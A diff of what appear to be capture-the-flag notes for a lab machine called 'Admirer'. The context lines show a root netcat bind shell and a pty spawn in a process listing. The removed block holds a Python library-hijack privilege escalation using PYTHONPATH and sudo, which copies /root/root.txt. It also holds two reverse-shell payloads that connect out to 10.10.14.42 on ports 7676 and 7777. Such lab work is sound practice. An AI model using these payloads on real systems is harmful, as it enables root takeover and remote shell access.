@@ -37,41 +37,8 @@ $dbname = "admirerdb";
 root      2668  0.0  0.2  27056  8840 ?        S    06:00   0:00 /usr/bin/python3 /opt/scripts/backup.py
 root      2669  0.0  0.0   4276   712 ?        S    06:00   0:00 sh -c nc -lvp 4444 -e /bin/bash
 root      2670  0.0  0.0  11196  3028 ?        S    06:00   0:00 bash
-root      2680  0.0  0.1  33820  7304 ?        S    06:02   0:00 python -c import pty;pty.spawn("/bin/bash")
+root      2680  0.0  0.1  33820  7304 ?        S    06:02   0:00 python -c 'import pty;pty.spawn("/bin/bash")'
 
 [+] Readable files belonging to root and readable by me but not world readable
 -rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
 -rw-r----- 1 root waldo 33 Jun  6 04:51 /home/waldo/user.txt
-
-
-python3 -c 'import sys; print(sys.path)'
-
-export PYTHONPATH=/home/waldo
-
-def make_archive(a, b, c):
-    print("Hello")
-    reader = open('/root/root.txt', 'r')
-    writer = open('/home/waldo/flag.txt', 'w')
-    writer.write(reader.read())
-
-
-def make_archive(a, b, c): 
-    import socket
-    import subprocess
-    import os
-
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("10.10.14.42", 7676))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])
-
-
-sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh
-
-
-import os
-
-def make_archive(a,b,c):
-    os.system('nc 10.10.14.42 7777 -e "/bin/sh"')
